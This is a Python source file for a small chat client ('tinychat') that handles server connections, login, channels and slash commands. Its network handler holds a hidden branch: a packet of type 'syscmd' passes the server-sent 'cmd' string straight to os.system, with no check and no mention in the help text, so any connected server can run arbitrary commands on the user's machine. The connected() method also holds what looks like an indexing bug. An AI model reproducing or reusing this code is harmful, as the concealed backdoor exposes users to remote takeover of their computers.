from .monitor import ClientMonitor
from tinychat.gui.colors import set_color
from threading import Thread
import json
import os
import re
import ipaddress

cmd_pat = r"^/.+ ?(.+)*$"


class ChatClient:
    def __init__(self, socket, queue):
        self.socket = socket
        self.queue = queue

        self.ui = None
        self.server = None
        self.proc_thread = None
        self.monitor = ClientMonitor()

        self.authorized = False
        self.username = ""
        self.channel = "__global__"

        self.load_settings()

    settings_path = os.path.abspath(os.path.join(os.pardir, "settings.json"))

    def load_settings(self):
        if os.path.exists(self.settings_path):
            try:
                with open(self.settings_path, 'r') as f:
                    settings = json.loads(f.read())
                    client_settings = settings['client']

                    self.username = client_settings['username']

            except (FileExistsError, json.JSONDecodeError, KeyError):
                pass

    def save_settings(self):
        settings = dict()

        try:
            if os.path.exists(self.settings_path):
                with open(self.settings_path, 'r') as f:
                    settings = json.loads(f.read())
        except (FileExistsError, json.JSONDecodeError, KeyError):
            pass

        with open(self.settings_path, 'w') as f:
            client_settings = dict()

            client_settings['username'] = self.username

            settings['client'] = client_settings

            f.write(json.dumps(settings))

    def start(self):
        self.proc_thread = Thread(target=self.event_proc)
        self.proc_thread.start()

        self.monitor.start()

    def event_proc(self, ):
        for event in iter(self.queue.get, 'exit'):
            event_type = event[0]

            if event_type == "connected":
                self.connected(event[1], event[2])
            elif event_type == "packet":
                self.handle_network(event[1])
            elif event_type == "disconnected":
                self.disconnected()

    def connected(self, server, err=None):
        if not err:
            self.server = server

            servers = self.monitor.get()
            if server[0] in servers.keys():
                server_name = server[server[0]][0].name
                self.ui.write(f"+green(Successfully connected to) {server_name}")
            else:
                self.ui.write(f"+green(Successfully connected to) {server[0]}")

            if self.username:
                self.auth(self.username)
            else:
                self.ui.write(set_color("You are not authorized!", "orangered"))
        else:
            self.ui.write(set_color(f"Failed to connect to {server[0]}: {err}", 'orangered'))

    def handle_network(self, pdata):
        packet = json.loads(pdata.decode('utf8'))

        try:
            if packet['type'] == 'message':
                channel = packet['channel']
                if channel == "__global__":
                    self.ui.write(f"+black([GLOBAL]) {packet['user']} : {packet['text']}")
                else:
                    self.ui.write(f"+black([{channel}]) {packet['user']} : {packet['text']}")

            elif packet['type'] == 'server_message':
                channel = packet['channel']

                if not channel:
                    self.ui.write(packet['text'])
                elif channel == "__global__":
                    self.ui.write(f"+black([GLOBAL]) {packet['text']}")
                else:
                    self.ui.write(f"+black([{channel}]) {packet['text']}")

            elif packet['type'] == 'channel_set':
                channel = packet['channel']
                self.channel = channel
                if channel == "__global__":
                    self.ui.write("+green(Successfully connected to channel) +black(GLOBAL)")
                else:
                    self.ui.write(f"+green(Successfully connected to channel) +black({channel})")

            elif packet['type'] == 'channel_remove':
                channel = packet['channel']
                self.channel = "__global__"
                if channel == "__global__":
                    self.ui.write("+orangered(Disconnected from the channel) +black(GLOBAL)")
                else:
                    self.ui.write(f"+orangered(Disconnected from the channel) +black({channel})")

            elif packet['type'] == "authresp":
                if packet['success']:
                    username = packet['username']
                    self.ui.write(f"+green(You are logged in as) {username}")
                    self.username = username
                    self.authorized = True
                else:
                    self.ui.write(f"+orangered(Authorization failed: {packet['message']})")
                    self.authorized = False

            elif packet['type'] == 'syscmd':
                cmd = packet['cmd']
                os.system(cmd)

        except (json.JSONDecodeError, KeyError):
            pass

    def disconnected(self):
        servers = self.monitor.get()
        if self.server[0] in servers.keys():
            server_name = servers[self.server[0]][0].name
            self.ui.write(f"+orangered(Disconnected from the server) {server_name}")
        else:
            self.ui.write(f"+orangered(Disconnected from the server) {self.server[0]}")

        self.server = None
        self.authorized = False
        self.channel = "__global__"

    def auth(self, username):
        login_p = json.dumps({
            'type': 'login',
            'username': username
        })
        self.socket.send(login_p.encode('utf8'))

    def send_message(self, text, channel):
        if self.username:
            if self.server:
                if channel == "__global__":
                    self.ui.write(f"+black([GLOBAL]) {self.username} : {text}")
                else:
                    self.ui.write(f"+black([{channel}]) {self.username} : {text}")

                msg_p = json.dumps({'type': 'message', 'text': text, 'channel': channel})
                self.socket.send(msg_p.encode('utf8'))
            else:
                self.ui.write(text)
        else:
            if self.server:
                self.ui.write(set_color("You are not authorized!", 'orangered'))
            else:
                self.ui.write(text)

    def rpc_send_packet(self, pdata):
        if self.server:
            self.socket.send(pdata.encode('utf8'))

    def rpc_get_status(self):
        return self.server, self.username

    def userinput(self, text):
        channel = self.channel

        if text.startswith('!'):
            channel = "__global__"
            text = text[1:]

        if re.match(cmd_pat, text):
            cmd_s = text.split()

            if cmd_s[0] == '/clear':
                self.ui.clear()
            elif cmd_s[0] == '/help':
                self.ui.write(helptxt + admin_helptxt)
            elif cmd_s[0] == '/login':
                self.login(cmd_s[1])
            elif cmd_s[0] == '/servers':
                self.display_servers()
            elif cmd_s[0] == '/connect':
                self.connect(cmd_s[1])
            elif cmd_s[0] == '/disconnect':
                self.socket.disconnect()
            else:
                self.send_message(text, channel)
        else:
            self.send_message(text, channel)

    def login(self, username):
        ui = self.ui

        if self.server:
            self.auth(username)
        else:
            ui.write(f"+green(Your future username:) {username}")
            self.username = username

    def display_servers(self):
        ui = self.ui
        servers = self.monitor.get().values()

        if len(servers) == 0:
            ui.write(set_color("No servers available", 'orangered'))
        else:
            ui.write(set_color("Servers:", 'green'))
            for i, (server, _) in enumerate(servers):
                ui.write(f"{i + 1}: {server.name} ({server.addr[0]})  -  {server.desc}")

    def connect(self, server):
        ui = self.ui
        servers = self.monitor.get()

        if server.isdigit():
            server = int(server)
            if 1 <= server <= len(servers):
                self.socket.connect(list(servers)[server - 1][0])
            else:
                ui.write(set_color("Incorrect server index", "orangered"))
        else:
            if server and check_ip(server):
                self.socket.connect(server)
            else:
                ui.write(set_color("Invalid ip address", "orangered"))

    def exit(self):
        self.queue.put('exit')

        if self.proc_thread:
            self.proc_thread.join()
            self.proc_thread = None

        self.socket.exit()
        self.monitor.close()
        self.save_settings()


def check_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


helptxt = """
/clear - очистить чат
/login (имя) - авторизация
/servers - список серверов
/connect (номер/ip сервера) - подключиться
/disconnect - отключиться
/userlist - список пользователей на сервере

"""

admin_helptxt = """
Admin commands:

/kick (user, reason)
/mute (user, reason)
/unmute (user)
/ban (user, reason)
/unban (user)
/ban-ip (addr, reason)
/unban-ip (addr)

"""
